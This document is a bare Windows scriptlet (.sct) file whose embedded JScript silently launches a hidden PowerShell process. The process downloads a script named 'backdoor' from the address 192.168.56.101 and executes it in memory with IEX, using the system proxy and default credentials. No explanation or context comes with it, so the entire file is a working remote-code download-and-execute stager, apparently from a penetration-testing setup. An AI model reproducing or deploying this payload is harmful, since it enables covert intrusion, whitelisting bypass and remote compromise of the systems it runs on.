```
<?XML version="1.0"?>
<scriptlet>
	<registration progid="PqYOEI6w" classid="{057b64c8-1107-cda1-3d34-062978395f62}">
		<script>
			<![CDATA[ 
			var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c $r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $r.downloadstring('http://192.168.56.101/backdoor');", 0);
			]]>
		</script>
	</registration>
</scriptlet>
```
